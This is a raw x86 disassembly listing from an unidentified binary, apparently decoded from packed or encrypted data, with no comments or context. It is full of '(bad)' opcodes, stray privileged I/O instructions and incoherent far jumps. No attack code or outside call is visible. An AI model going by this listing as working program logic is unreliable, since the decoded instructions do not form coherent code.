  41b63c:	dec    esi
  41b63d:	mov    ds:0xa8b3404,eax
  41b642:	idiv   esi
  41b644:	xchg   ebp,eax
  41b645:	push   ebx
  41b646:	rol    DWORD PTR [ebx+0x38],0x41
  41b64a:	and    eax,0xa2d4481d
  41b64f:	pop    eax
  41b650:	icebp  
  41b651:	mov    ecx,0xdaa11ad8
  41b656:	push   cs
  41b657:	inc    eax
  41b658:	sub    dh,cl
  41b65a:	fdivr  DWORD PTR [esi+0x6b]
  41b65d:	test   al,0x84
  41b65f:	pusha  
  41b660:	mov    bl,0x29
  41b662:	jmp    FWORD PTR [ecx+0x25]
  41b665:	pop    ebx
  41b666:	xchg   edx,eax
  41b667:	xchg   ebp,eax
  41b668:	dec    edx
  41b669:	dec    esi
  41b66a:	cmp    DWORD PTR [ecx],ebx
  41b66c:	push   ebx
  41b66d:	mov    cl,0xf4
  41b66f:	inc    ecx
  41b670:	and    al,0x4e
  41b672:	pop    esp
  41b673:	jle    0x41b643
  41b675:	int    0x31
  41b677:	pop    ds
  41b678:	add    dl,BYTE PTR [esi]
  41b67a:	mov    eax,ds:0xa953d29e
  41b67f:	repz jno 0x41b6af
  41b682:	mov    esp,0x17132fb2
  41b687:	inc    ebx
  41b688:	cmp    al,0x9
  41b68a:	xchg   edx,eax
  41b68b:	and    esi,DWORD PTR [ebp+edx*4+0xb84b8]
	...
  41b6f2:	add    BYTE PTR [eax],al
  41b6f4:	test   al,0x63
  41b6f6:	sbb    edx,DWORD PTR [esi+0x7fadfedb]
  41b6fc:	sti    
  41b6fd:	push   ds
  41b6fe:	mov    ah,dh
  41b700:	push   ebx
  41b701:	sub    eax,0x236c0047
  41b706:	add    DWORD PTR [eax],eax
  41b708:	add    eax,0xfa000001
  41b70d:	ins    BYTE PTR es:[edi],dx
  41b70e:	mov    ebx,0x1f9ab96f
  41b713:	jne    0x41b73d
  41b715:	aam    0x7e
  41b717:	add    eax,0xb1a4487a
  41b71c:	(bad)  [edx+0x3cf05563]
  41b722:	ror    BYTE PTR [eax+0x2],cl
  41b725:	or     cl,BYTE PTR [esi]
  41b727:	mov    DWORD PTR [eax+0x4d],esi
  41b72a:	jns    0x41b728
  41b72c:	inc    ebx
  41b72d:	pop    edi
  41b72e:	sbb    al,0x6f
  41b730:	jge    0x41b72d
  41b732:	pop    ebp
  41b733:	push   ss
  41b734:	add    DWORD PTR [edx+0x77e5f244],ebx
  41b73a:	shl    DWORD PTR [esi-0x3e963c6d],0xd6
  41b741:	xchg   ebp,eax
  41b742:	push   0x24
  41b744:	in     eax,0xc3
  41b746:	inc    edx
  41b747:	cmp    al,0x62
  41b749:	(bad)  
  41b74a:	and    DWORD PTR [ebp+0x4f],esi
  41b74d:	cmp    bp,WORD PTR [ecx]
  41b750:	xor    cl,BYTE PTR [ecx-0x60]
  41b753:	(bad)  [esi+0x6c]
  41b756:	lds    esi,FWORD PTR [esp+ebx*8+0x12]
  41b75a:	mov    WORD PTR [ebx+0x6d],cs
  41b75d:	imul   edx,esp,0x2b
  41b760:	and    edi,DWORD PTR [esi-0x64]
  41b763:	inc    eax
  41b764:	stos   DWORD PTR es:[edi],eax
  41b765:	pop    es
  41b766:	jb     0x41b73d
  41b768:	(bad)  
  41b769:	fiadd  DWORD PTR [edi+edi*4-0x482deb73]
  41b770:	jl     0x41b7ba
  41b772:	and    al,0x11
  41b774:	xor    DWORD PTR [eax+0x4eae92ec],ebp
  41b77a:	leave  
  41b77b:	aam    0xfc
  41b77d:	fiadd  WORD PTR [edx]
  41b77f:	fcom   QWORD PTR [esi]
  41b781:	pop    es
  41b782:	ss mov eax,0x3bb7154f
  41b788:	ds sahf 
  41b78a:	je     0x41b7fd
  41b78c:	loop   0x41b7b3
  41b78e:	call   0x60a3ea6e
  41b793:	jecxz  0x41b758
  41b795:	(bad)  
  41b796:	and    DWORD PTR [ebp+0x7eef044f],ebp
  41b79c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b79d:	iret   
  41b79e:	rcl    DWORD PTR [ebx+0x600845d3],cl
  41b7a4:	mov    ah,0xe3
  41b7a6:	mov    edx,0xcb453b
  41b7ab:	retf   0xecfa
  41b7ae:	pop    eax
  41b7af:	test   eax,0xa9a2b4f7
  41b7b4:	daa    
  41b7b5:	mov    ecx,DWORD PTR [eax+eax*1-0x4b82d7eb]
  41b7bc:	in     eax,dx
  41b7bd:	push   ebp
  41b7be:	xor    bh,BYTE PTR [esi-0x38]
  41b7c1:	xchg   ecx,eax
  41b7c2:	frstor [ecx+0x5a]
  41b7c5:	sbb    eax,0xa3bd320f
  41b7ca:	pop    ebp
  41b7cb:	pop    ebp
  41b7cc:	xchg   BYTE PTR [edi],bl
  41b7ce:	sahf   
  41b7cf:	imul   edi,DWORD PTR [eax],0x36a04a67
  41b7d5:	nop
  41b7d6:	lock arpl WORD PTR [eax-0xd57b3d2],sp
  41b7dd:	sbb    BYTE PTR [ebx-0x1c],0x4
  41b7e1:	mov    WORD PTR [edx+0x75dfcf9e],?
  41b7e7:	mov    esp,0xe2683f15
  41b7ec:	mov    edi,0xec72b11f
  41b7f1:	jge    0x41b7df
  41b7f3:	and    BYTE PTR ds:0x48db3563,cl
  41b7f9:	pushf  
  41b7fa:	adc    al,0xd3
  41b7fc:	loopne 0x41b798
  41b7fe:	and    BYTE PTR [edx+esi*1-0x2a],0xde
  41b803:	stc    
  41b804:	push   edi
  41b805:	sbb    edi,ecx
  41b807:	jecxz  0x41b7ce
  41b809:	adc    BYTE PTR [ecx+0x4f7a913e],dl
  41b80f:	mov    WORD PTR [ebx+0x0],ds
	...
  41b872:	add    BYTE PTR [eax],al
  41b874:	mov    bh,ah
  41b876:	(bad)  
  41b877:	dec    esi
  41b878:	idiv   DWORD PTR [edi-0x75]
  41b87b:	cld    
  41b87c:	ret    0x78e3
  41b87f:	add    al,0xb1
  41b881:	inc    esp
  41b882:	push   ecx
  41b883:	mov    ds:0x12471,al
  41b888:	add    eax,0x86000001
  41b88d:	mov    ds:0xd4a6b6a5,eax
  41b892:	mov    ecx,0xf8f20c90
  41b897:	fdiv   QWORD PTR [edx]
  41b899:	mov    al,ds:0xe3c0e0c7
  41b89e:	ins    BYTE PTR es:[edi],dx
  41b89f:	in     al,dx
  41b8a0:	mov    edi,0x852b3d27
  41b8a5:	mov    ebx,0x67ba8736
  41b8aa:	cld    
  41b8ab:	mov    eax,0xce834d59
  41b8b0:	push   esi
  41b8b1:	push   esp
  41b8b2:	cli    
  41b8b3:	push   edi
  41b8b4:	xor    al,0x9
  41b8b6:	cwde   
  41b8b7:	aam    0xe4
  41b8b9:	dec    esp
  41b8ba:	in     al,0x1c
  41b8bc:	jmp    0x41b8bd
  41b8be:	inc    ebp
  41b8bf:	xchg   esp,eax
  41b8c1:	mul    DWORD PTR fs:[ebx+esi*2+0x68]
  41b8c6:	cmp    ebp,ecx
  41b8c8:	dec    DWORD PTR [esi]
  41b8ca:	rcr    ch,1
  41b8cc:	mov    eax,0x838c5a6c
  41b8d1:	fiadd  DWORD PTR [esi-0x23fa30e0]
  41b8d7:	fwait
  41b8d8:	aaa    
  41b8d9:	sub    edx,eax
  41b8db:	test   dh,bh
  41b8dd:	push   ecx
  41b8de:	cmp    bl,BYTE PTR [ecx+0x5dd03391]
  41b8e4:	jae    0x41b8b2
  41b8e6:	push   0x49
  41b8e8:	xchg   edx,eax
  41b8e9:	sub    BYTE PTR [edi+0x7a],bh
  41b8ec:	imul   eax,DWORD PTR [edx+0x8],0xffffffee
  41b8f0:	adc    ch,BYTE PTR [edx]
  41b8f2:	in     al,dx
  41b8f3:	pop    esp
  41b8f4:	mov    WORD PTR [edx*2+0x3cf110e4],gs
  41b8fb:	cdq    
  41b8fc:	xchg   esi,eax
  41b8fd:	ins    DWORD PTR es:[edi],dx
  41b8fe:	inc    edi
  41b8ff:	cmp    eax,DWORD PTR [edi-0x737a7bad]
  41b905:	and    al,0x8f
  41b907:	fsubr  st(1),st
  41b909:	or     edi,DWORD PTR [ebx-0xdd5da7a]
  41b90f:	sbb    eax,0xca2a2f71
  41b914:	inc    esp
  41b915:	cmp    eax,DWORD PTR ss:[edi-0x5aa259be]
  41b91c:	cmp    eax,0xef61c5d9
  41b921:	and    eax,0xdd553d03
  41b926:	xor    ch,BYTE PTR [ecx+0x62]
  41b929:	dec    edi
  41b92a:	fcomp  QWORD PTR [ebx]
  41b92c:	in     al,dx
  41b92d:	sub    eax,0x824ae505
  41b932:	mov    cs,WORD PTR [ebx-0x58a6bd6]
  41b938:	test   BYTE PTR gs:[ebp+0x25c9aefc],0xab
  41b940:	mov    ds:0xf85faeb,al
  41b945:	pop    es
  41b946:	and    al,0xef
  41b948:	ss sbb al,0xa1
  41b94b:	jb     0x41b948
  41b94d:	sbb    ch,BYTE PTR [ecx+0xbd6f5c3]
  41b953:	cmp    DWORD PTR [esi],0x8cf2df4f
  41b959:	or     BYTE PTR [edi],dl
  41b95b:	add    al,0xb0
  41b95d:	fwait
  41b95e:	scas   eax,DWORD PTR es:[edi]
  41b95f:	hlt    
  41b960:	cdq    
  41b961:	cwde   
  41b962:	mov    al,0xfe
  41b964:	or     al,dh
  41b966:	add    bh,bl
  41b968:	adc    eax,0x3734acee
  41b96d:	sar    BYTE PTR [ebp+0xb3dcd68],0xc6
  41b974:	test   eax,0x8ad27ddb
  41b979:	push   ecx
  41b97a:	lods   al,BYTE PTR ds:[esi]
  41b97b:	mov    ebx,0x2651c890
  41b980:	adc    al,0x5f
  41b982:	ja     0x41b94f
  41b984:	dec    esp
  41b985:	sub    DWORD PTR [edx+0x66],edi
  41b988:	inc    eax
  41b989:	or     DWORD PTR [edi],ebx
  41b98b:	repz fisttp QWORD PTR [edx+0x5d930a]
	...
  41b9f2:	add    BYTE PTR [eax],al
  41b9f4:	ret    
  41b9f5:	mov    esp,0xf87f4844
  41b9fa:	iret   
  41b9fb:	mov    edi,0x8c8b3b8c
  41ba00:	cmp    al,0xec
  41ba02:	cmp    esi,0x76
  41ba05:	and    eax,0x1050001
  41ba0a:	add    BYTE PTR [eax],al
  41ba0c:	mov    esp,0x43030643
  41ba11:	pop    ebx
  41ba12:	sbb    al,0x99
  41ba14:	mov    ds:0xf58bf58f,eax
  41ba19:	cmp    eax,0x5d34f960
  41ba1e:	mov    edi,0x9ae6a158
  41ba23:	sbb    DWORD PTR [esi],ecx
  41ba25:	push   ds
  41ba26:	xchg   ebx,eax
  41ba27:	push   ebx
  41ba28:	jae    0x41b9c0
  41ba2a:	or     al,0xc8
  41ba2c:	inc    esp
  41ba2d:	loop   0x41ba8d
  41ba2f:	retf   
  41ba30:	(bad)  
  41ba31:	aaa    
  41ba32:	sub    BYTE PTR [ebp-0x80],dl
  41ba35:	mov    esp,0x3784e815
  41ba3a:	out    0xb3,al
  41ba3c:	mov    cl,0x30
  41ba3e:	jecxz  0x41ba4a
  41ba40:	retf   
  41ba41:	imul   edi,DWORD PTR [esp+eiz*4+0x19ba5e58],0x4fdafd12
  41ba4c:	sbb    BYTE PTR [eax+0x6f078f3b],ch
  41ba52:	mov    bl,0x75
  41ba54:	pushf  
  41ba55:	lock inc edi
  41ba57:	jmp    0xaf28ffc6
  41ba5c:	(bad)  
  41ba5d:	pop    ebx
  41ba5e:	pop    es
  41ba5f:	aas    
  41ba60:	xchg   ecx,eax
  41ba61:	or     DWORD PTR [ebx-0x58],edx
  41ba64:	adc    BYTE PTR [esp+ebx*4-0x5c],ah
  41ba68:	sub    eax,0xa016dc9b
  41ba6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba6e:	pop    es
  41ba6f:	ret    
  41ba70:	adc    BYTE PTR [ebx-0x2365ff02],dl
  41ba76:	mov    esi,0x29dbbb8b
  41ba7b:	mov    ebx,0xad18dd94
  41ba80:	repnz push eax
  41ba82:	jg     0x41ba8a
  41ba84:	fld    QWORD PTR [ebx-0x68]
  41ba87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ba88:	pop    es
  41ba89:	out    dx,al
  41ba8a:	adc    eax,0x18a34306
  41ba8f:	or     eax,0xc0809c34
  41ba94:	icebp  
  41ba95:	mov    DWORD PTR [ebx+0x52],esi
  41ba98:	or     eax,0xcea52633
  41ba9d:	jns    0x41ba33
  41ba9f:	dec    eax
  41baa0:	call   0xdf23:0x278a1ad0
  41baa7:	inc    ecx
  41baa8:	sub    bl,dl
  41baaa:	rcr    cl,cl
  41baac:	scas   al,BYTE PTR es:[edi]
  41baad:	sbb    DWORD PTR [ecx],edx
  41baaf:	into   
  41bab0:	aaa    
  41bab1:	sbb    ecx,eax
  41bab3:	ret    
  41bab4:	push   edi
  41bab5:	ja     0x41ba99
  41bab7:	sub    ebp,DWORD PTR [eax+0x7b]
  41baba:	sbb    dh,ah
  41babc:	cmp    DWORD PTR [esi+0x7f3cb330],edi
  41bac2:	pop    esp
  41bac3:	ret    0xff0c
  41bac6:	das    
  41bac7:	xchg   ebp,eax
  41bac8:	dec    ecx
  41bac9:	mov    ds:0x6606ec05,al
  41bace:	ds add al,0x19
  41bad1:	out    dx,al
  41bad2:	scas   eax,DWORD PTR es:[edi]
  41bad3:	push   ecx
  41bad4:	pop    esi
  41bad5:	mov    ds:0xfdf6abb9,eax
  41bada:	test   eax,0x2664f665
  41badf:	dec    edx
  41bae0:	sub    BYTE PTR [esi+0x6ae2c6f7],bl
  41bae6:	scas   al,BYTE PTR es:[edi]
  41bae7:	xlat   BYTE PTR ds:[ebx]
  41bae8:	fnsave [esi-0xe]
  41baeb:	fucomp st(0)
  41baed:	loope  0x41ba9c
  41baef:	mov    ecx,0xb84158f8
  41baf4:	into   
  41baf5:	ret    
  41baf6:	pop    edi
  41baf7:	rcr    BYTE PTR [eax],1
  41baf9:	cs aas 
  41bafb:	std    
  41bafc:	mov    ebx,ebx
  41bafe:	fcomp  QWORD PTR [ecx+0x65]
  41bb01:	xchg   BYTE PTR [ebx+eiz*8],bh
  41bb04:	arpl   WORD PTR [edi-0x109ca5c4],ax
  41bb0a:	cwde   
  41bb0b:	sub    edx,DWORD PTR [eax+0x76]
  41bb0e:	sub    eax,0x8900
	...
  41bb73:	add    BYTE PTR [edx],cl
  41bb75:	mov    eax,0xbfb7aaa5
  41bb7a:	(bad)  
  41bb7c:	jg     0x41bb83
  41bb7e:	arpl   WORD PTR [edi-0x3a],cx
  41bb81:	mov    edx,0x267b5a5b
  41bb86:	add    DWORD PTR [eax],eax
  41bb88:	add    eax,0x83000001
  41bb8d:	std    
  41bb8e:	inc    edx
  41bb8f:	fstp   TBYTE PTR [esi]
  41bb91:	mov    eax,ds:0x87c95f2
  41bb96:	and    eax,0x9c4ad442
  41bb9b:	jmp    0xa3a5:0x8fa6c65a
  41bba2:	pop    ss
  41bba3:	xchg   ebp,eax
  41bba4:	out    0xa7,eax
  41bba6:	stc    
  41bba7:	and    eax,0xcb85ac8b
  41bbac:	scas   al,BYTE PTR es:[edi]
  41bbad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bbae:	cmp    dl,0x12
  41bbb1:	ror    BYTE PTR [ebp+0x4cb87fb6],1
  41bbb7:	sbb    DWORD PTR [ecx+0x613e8a41],edi
  41bbbd:	xor    eax,0x29f2af78
  41bbc2:	aad    0x5b
  41bbc4:	ficomp WORD PTR [esi]
  41bbc6:	mov    ebp,0x1edce87f
  41bbcb:	sub    al,BYTE PTR [ebp-0x7c244038]
  41bbd1:	jb     0x41bb8d
  41bbd3:	cmp    BYTE PTR [ebp+ecx*8-0x51041405],0xdc
  41bbdb:	cmp    bl,BYTE PTR [ebp-0xe]
  41bbde:	fmulp  st(6),st
  41bbe0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bbe1:	out    dx,eax
  41bbe2:	push   eax
  41bbe3:	dec    esp
  41bbe4:	sub    esp,DWORD PTR [esi+eiz*4-0x77]
  41bbe8:	and    esp,edi
  41bbea:	sbb    eax,0x3829df19
  41bbef:	ja     0x41bc41
  41bbf1:	aaa    
  41bbf2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bbf3:	mov    esp,ds
  41bbf5:	loope  0x41bc0b
  41bbf7:	fisub  DWORD PTR [ecx]
  41bbf9:	xchg   ecx,eax
  41bbfa:	sub    BYTE PTR [ecx-0x53],bh
  41bbfd:	inc    ecx
  41bbfe:	arpl   WORD PTR [esi-0x2ea20d97],di
  41bc04:	(bad)  
  41bc05:	jnp    0x41bbb3
  41bc07:	aam    0x59
  41bc09:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  41bc0b:	and    ax,0x87c1
  41bc0f:	cli    
  41bc10:	pop    ss
  41bc11:	push   eax
  41bc12:	aas    
  41bc13:	and    eax,0x40b34c22
  41bc18:	loopne 0x41bc15
  41bc1a:	jb     0x41bc66
  41bc1c:	and    BYTE PTR [eax-0x17],bl
  41bc1f:	dec    si
  41bc21:	push   edx
  41bc22:	push   ss
  41bc23:	jo     0x41bbc0
  41bc25:	mov    DWORD PTR [ecx+0x5af94842],edx
  41bc2b:	or     BYTE PTR [edx],0x49
  41bc2e:	adc    bh,cl
  41bc30:	or     al,0xb2
  41bc32:	(bad)  
  41bc33:	jo     0x41bcb1
  41bc35:	cmp    bl,BYTE PTR [edi-0x6d]
  41bc38:	mov    dh,0xf2
  41bc3a:	cmc    
  41bc3b:	in     eax,dx
  41bc3c:	das    
  41bc3d:	mov    bl,0x0
  41bc3f:	add    DWORD PTR [esi-0x1428d8cf],0x61ce267b
  41bc49:	push   ecx
  41bc4a:	nop
  41bc4b:	push   0x2b
  41bc4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc4e:	ret    0x357a
  41bc51:	jmp    0xdc95:0x5e31d409
  41bc58:	inc    esp
  41bc59:	cmp    al,0x35
  41bc5b:	jae    0x41bc4d
  41bc5d:	test   eax,0x1bd6160b
  41bc62:	xor    ebp,ecx
  41bc64:	adc    DWORD PTR [ebp-0x44],0x2d
  41bc68:	bound  ebx,QWORD PTR ds:0x8b73fcee
  41bc6e:	xchg   DWORD PTR [edx+0xb969595],edx
  41bc74:	cmp    al,0xf8
  41bc76:	push   edi
  41bc77:	mov    dh,0x48
  41bc79:	jbe    0x41bccb
  41bc7b:	out    0x54,eax
  41bc7d:	inc    bx
  41bc7f:	imul   edi,DWORD PTR [eax+ecx*1+0x1e],0x7c586e5b
  41bc87:	jl     0x41bc28
  41bc89:	jne    0x41bc9e
  41bc8b:	loopne 0x41bc91
  41bc8d:	out    dx,eax
  41bc8e:	cdq    
  41bc8f:	push   edx
  41bc90:	adc    eax,0x0
	...
  41bcf1:	add    BYTE PTR [eax],al
  41bcf3:	add    dl,dl
  41bcf5:	xor    bh,dl
  41bcf7:	clc    
  41bcf8:	cli    
  41bcf9:	clc    
  41bcfa:	sar    BYTE PTR [edx],cl
  41bcfc:	sti    
  41bcfd:	mov    ebp,0xe852d9d8
  41bd02:	fs iret 
  41bd04:	and    BYTE PTR [edi],0x1
  41bd07:	add    BYTE PTR ds:0xfa000001,al
  41bd0d:	pop    edi
  41bd0e:	pop    edi
  41bd0f:	xlat   BYTE PTR ds:[ebx]
  41bd10:	adc    BYTE PTR [ebx-0x7f6febd],cl
  41bd16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd17:	icebp  
  41bd18:	inc    esp
  41bd19:	fdivr  st,st(7)
  41bd1b:	xchg   esp,eax
  41bd1c:	das    
  41bd1d:	(bad)  
  41bd1e:	std    
  41bd1f:	dec    ecx
  41bd20:	mov    BYTE PTR [ebx+0x6e6665f6],dl
  41bd26:	jl     0x41bd03
  41bd28:	sub    BYTE PTR [edx-0xde511e8],bl
  41bd2e:	push   0xffffffdb
  41bd30:	cdq    
  41bd31:	inc    edx
  41bd32:	les    edx,FWORD PTR [esp+ebx*4+0x656979ed]
  41bd39:	cdq    
  41bd3a:	sub    ah,BYTE PTR ds:0x1e1e1960
  41bd40:	mov    DWORD PTR [edx+0x61],esp
  41bd43:	sti    
  41bd44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd45:	mov    ebp,0xdfa0e81f
  41bd4a:	dec    edi
  41bd4b:	mov    ecx,0x5ccb7980
  41bd50:	addr16 pusha 
  41bd52:	cs (bad) 
  41bd54:	pop    ds
  41bd55:	jle    0x41bdc8
  41bd57:	push   ds
  41bd58:	mov    esi,0x90e36418
  41bd5d:	dec    esp
  41bd5e:	sbb    DWORD PTR [ebp+ecx*2-0x23],ebp
  41bd62:	rol    DWORD PTR [ebp-0x2e],cl
  41bd65:	sahf   
  41bd66:	cmovns eax,DWORD PTR [edi]
  41bd69:	xor    eax,0xb6d42787
  41bd6e:	daa    
  41bd6f:	pop    esp
  41bd70:	adc    BYTE PTR [ecx],al
  41bd72:	jmp    0x5223:0x1a83eadf
  41bd79:	jo     0x41bd2d
  41bd7b:	cwde   
  41bd7c:	add    eax,0xc976919d
  41bd81:	dec    ecx
  41bd82:	mov    dl,0x80
  41bd84:	icebp  
  41bd85:	adc    esi,DWORD PTR [eax]
  41bd87:	inc    edx
  41bd88:	in     al,0xf3
  41bd8a:	stos   DWORD PTR es:[edi],eax
  41bd8b:	mov    edx,0x4d19b8c6
  41bd90:	jnp    0x41bd2e
  41bd92:	jp     0x41bd65
  41bd94:	xchg   edi,eax
  41bd95:	aaa    
  41bd96:	retf   0x25ed
  41bd99:	push   ss
  41bd9a:	imul   eax,DWORD PTR [edx],0x3a
  41bd9d:	push   esp
  41bd9e:	adc    eax,0x8324ddf3
  41bda3:	cli    
  41bda4:	jne    0x41bda4
  41bda6:	dec    esp
  41bda7:	fst    DWORD PTR [ebx-0x6ab55931]
  41bdad:	jae    0x41be05
  41bdaf:	sub    BYTE PTR [edi-0x11],bh
  41bdb2:	lea    eax,[edx-0x50]
  41bdb5:	mov    bl,0x55
  41bdb7:	push   ecx
  41bdb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bdb9:	dec    edi
  41bdba:	jnp    0x41bd6a
  41bdbc:	in     eax,0xfb
  41bdbe:	adc    al,0xf9
  41bdc0:	out    dx,al
  41bdc1:	mov    esi,0x57c20e
  41bdc6:	add    cl,BYTE PTR [ebx]
  41bdc8:	mov    ds:0xbcdb7461,eax
  41bdcd:	xchg   ebp,eax
  41bdce:	enter  0x9260,0x2d
  41bdd2:	popf   
  41bdd3:	xchg   edx,eax
  41bdd4:	loope  0x41bde5
  41bdd6:	fcomip st,st(3)
  41bdd8:	mov    esp,0xe02e64ac
  41bddd:	repz jg 0x41bd9e
  41bde0:	popf   
  41bde1:	scas   eax,DWORD PTR es:[edi]
  41bde2:	pop    ebp
  41bde3:	inc    esp
  41bde4:	pop    es
  41bde5:	mov    esi,0xc488e50f
  41bdea:	in     al,0xcb
  41bdec:	sbb    BYTE PTR [eax],cl
  41bdee:	mov    esp,0x833026e2
  41bdf3:	mov    esp,0xd4dd3add
  41bdf8:	xor    ebp,DWORD PTR [ebx-0x4e1e93d2]
  41bdfe:	xchg   DWORD PTR [ecx-0x21],ebp
  41be01:	in     eax,0x46
  41be03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be04:	clc    
  41be05:	dec    edx
  41be06:	and    eax,0xdbf6d884
  41be0b:	cmc    
  41be0c:	out    0x89,al
  41be0e:	(bad)  
  41be0f:	iret   
  41be10:	add    DWORD PTR [eax],eax
	...
  41be72:	add    BYTE PTR [eax],al
  41be74:	test   DWORD PTR [ebp+0x7b9c6a9c],ecx
  41be7a:	imul   edi
  41be7c:	mov    ebp,DWORD PTR [ecx+0x63d33f66]
  41be82:	lods   al,BYTE PTR ds:[esi]
  41be83:	loopne 0x41be0a
  41be85:	sub    BYTE PTR [ecx],al
  41be87:	add    BYTE PTR ds:0x7f000001,al
  41be8d:	js     0x41be23
  41be8f:	imul   DWORD PTR [ecx+0x0]
  41be92:	sbb    eax,DWORD PTR ds:0xd4e88979
  41be98:	mov    dh,0x34
  41be9a:	dec    ebx
  41be9b:	and    eax,0x4f4207e1
  41bea0:	and    DWORD PTR [edx],esi
  41bea2:	xlat   BYTE PTR ds:[ebx]
  41bea3:	dec    esp
  41bea4:	inc    ebx
  41bea5:	in     al,dx
  41bea6:	jo     0x41bee6
  41bea8:	add    ebx,DWORD PTR ds:0x5aed0776
  41beae:	pusha  
  41beaf:	cld    
  41beb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41beb1:	xor    al,0x60
  41beb3:	push   ss
  41beb4:	icebp  
  41beb5:	ss iret 
  41beb7:	(bad)  
  41beb8:	sub    BYTE PTR [esi+eiz*1-0x32],bh
  41bebc:	dec    ebp
  41bebd:	shl    BYTE PTR [edi+0x6fe798b],1
  41bec3:	push   ebp
  41bec5:	jo     0x41be95
  41bec7:	mul    DWORD PTR ds:0x36518992
  41becd:	cmp    al,BYTE PTR [ebp-0x2140b5e4]
  41bed3:	repnz inc esp
  41bed5:	hlt    
  41bed6:	push   ds
  41bed7:	test   eax,0x3ce9503d
  41bedc:	in     al,0xd2
  41bede:	fwait
  41bedf:	adc    al,0xb2
  41bee1:	call   0x487b:0x1afbee2d
  41bee8:	cmp    BYTE PTR [ecx],dh
  41beea:	push   0x10
  41beec:	ror    edx,1
  41beee:	sub    BYTE PTR [edi+0x489c46e3],dl
  41bef4:	mov    bl,0xfe
  41bef6:	xor    DWORD PTR [ebp-0x25],0xc35dc0b0
  41befd:	ins    BYTE PTR es:[edi],dx
  41befe:	in     al,dx
  41beff:	jmp    0x82ca9f4f
  41bf04:	in     al,0x8b
  41bf06:	mov    edi,DWORD PTR [ebp-0x134e98f4]
  41bf0c:	lock push ss
  41bf0e:	dec    eax
  41bf0f:	mov    fs,WORD PTR [esi]
  41bf11:	pusha  
  41bf12:	push   esp
  41bf13:	popa   
  41bf14:	out    0x65,eax
  41bf16:	xchg   eax,eax
  41bf18:	loop   0x41bf5d
  41bf1a:	sbb    eax,0xc44f2f07
  41bf1f:	mov    edi,0xddd0dcd8
  41bf24:	mov    esi,0xb9933b6d
  41bf29:	stc    
  41bf2a:	es das 
  41bf2c:	jge    0x41bf94
  41bf2e:	fist   DWORD PTR [edx-0x72095825]
  41bf34:	(bad)  [esi+0x74a96390]
  41bf3a:	push   ebx
  41bf3b:	xchg   edi,eax
  41bf3c:	loop   0x41bf04
  41bf3e:	outs   dx,DWORD PTR ds:[esi]
  41bf3f:	int    0x93
  41bf41:	out    dx,al
  41bf42:	or     BYTE PTR cs:[ecx+0x2d6246c4],al
  41bf49:	adc    dh,al
  41bf4b:	jns    0x41bf80
  41bf4d:	dec    edx
  41bf4e:	and    BYTE PTR [edi],bh
  41bf50:	jne    0x41bf7f
  41bf52:	(bad)  
  41bf53:	arpl   WORD PTR [ecx-0x7c],bp
  41bf56:	or     al,0x5f
  41bf58:	aas    
  41bf59:	cs gs scas eax,DWORD PTR es:[edi]
  41bf5c:	push   esp
  41bf5d:	jmp    0x41bf6e
  41bf5f:	inc    ebx
  41bf60:	retf   0x7d0d
  41bf63:	ds (bad) 
  41bf65:	jmp    FWORD PTR [edi+0x37c516a0]
  41bf6b:	xlat   BYTE PTR ds:[ebx]
  41bf6c:	ret    
  41bf6d:	and    BYTE PTR [edi-0x6b4cad0d],ah
  41bf73:	shl    DWORD PTR [esi],cl
  41bf75:	and    edx,DWORD PTR ds:0xc1247e20
  41bf7b:	adc    al,0x7a
  41bf7d:	pop    eax
  41bf7e:	push   ebp
  41bf7f:	outs   dx,BYTE PTR ds:[esi]
  41bf80:	test   DWORD PTR [ebx],0xcbaf8583
  41bf86:	retf   
  41bf87:	into   
  41bf88:	adc    cl,BYTE PTR [edx+0x1296b1eb]
  41bf8e:	out    0xde,al
  41bf90:	or     eax,DWORD PTR [eax]
	...
  41bff2:	add    BYTE PTR [eax],al
  41bff4:	fs jae 0x41c02a
  41bff7:	es aaa 
  41bff9:	data16 jne 0x41c06f
  41bffc:	ins    BYTE PTR es:[edi],dx
  41bffd:	daa    
  41bffe:	mov    cl,0xc1
  41c000:	pop    ds
  41c001:	pop    ebp
  41c002:	push   0x1298af6
  41c007:	add    BYTE PTR ds:0x41000001,al
  41c00d:	fidiv  DWORD PTR [ebp+edi*4-0x6f]
  41c011:	into   
  41c012:	setnp  ah
  41c015:	nop
  41c016:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c017:	jge    0x41bfad
  41c019:	jae    0x41c00d
  41c01b:	outs   dx,BYTE PTR ds:[esi]
  41c01c:	lods   eax,DWORD PTR ds:[esi]
  41c01d:	int    0x23
  41c01f:	and    ch,BYTE PTR [ecx]
  41c021:	loop   0x41bfde
  41c023:	jno    0x41c003
  41c025:	out    0x99,eax
  41c027:	xlat   BYTE PTR ds:[ebx]
  41c028:	mov    bh,0x7b
  41c02a:	inc    ebp
  41c02b:	mov    ah,cl
  41c02d:	mov    al,ds:0xe373b442
  41c032:	mov    dl,0x85
  41c034:	std    
  41c035:	pop    ecx
  41c036:	mov    gs,esp
  41c038:	xchg   esi,eax
  41c039:	or     DWORD PTR [ebp+0x2a953c05],0x734211dd
  41c043:	mov    esp,0x2af85b07
  41c048:	jecxz  0x41c04d
  41c04a:	mov    bh,0x43
  41c04c:	adc    al,0x16
  41c04e:	fwait
  41c04f:	data16 int3 
  41c051:	div    ecx
  41c053:	xchg   esp,eax
  41c054:	sub    bl,BYTE PTR es:[eax]
  41c057:	(bad)  
  41c059:	gs retf 0xe27e
  41c05d:	mov    DWORD PTR [ebx],eax
  41c05f:	ficom  DWORD PTR gs:[ecx]
  41c062:	push   ds
  41c063:	sbb    BYTE PTR [ebx+0x49],al
  41c066:	pop    ecx
  41c067:	pop    esp
  41c068:	daa    
